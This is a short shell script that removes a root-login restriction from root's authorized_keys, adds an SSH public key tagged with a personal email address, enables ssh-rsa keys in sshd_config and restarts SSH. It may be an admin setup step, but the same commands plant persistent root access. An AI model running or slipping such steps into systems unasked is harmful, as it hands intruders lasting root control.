mkdir -p /root/.ssh/;
sed -e "s/echo;sleep 10;exit 142//g" -i /root/.ssh/authorized_keys;
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEYf3qvryyZ+rAz2eLggn/YFS/jjUTQENtCB5uOctGvH er.santoshtharu@gmail.com" >> /root/.ssh/authorized_keys;
echo "PubkeyAcceptedKeyTypes=+ssh-rsa" >> /etc/ssh/sshd_config;
service ssh restart;
